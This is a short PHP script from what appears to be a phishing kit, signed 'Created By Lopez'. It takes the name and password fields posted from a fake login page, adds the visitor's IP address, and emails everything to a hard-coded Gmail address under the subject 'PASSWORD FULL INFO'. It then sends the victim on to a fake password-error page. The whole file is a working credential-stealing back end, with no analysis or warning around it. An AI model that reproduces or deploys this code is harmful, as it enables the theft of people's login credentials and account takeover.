<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------PASSWORD FULL INFO---------------------\n";
$message .= "??????: ".$_POST['name']."\n";
$message .= "??????: ".$_POST['name1']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Lopez---------------------\n";
$recipient = "ndaagoddy@gmail.com";
$subject = "PASSWORD FULL INFO";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Texlon-Version: 1.0\n";
	 mail("", "Texlon$", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: Return.changePasswordFalse.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>

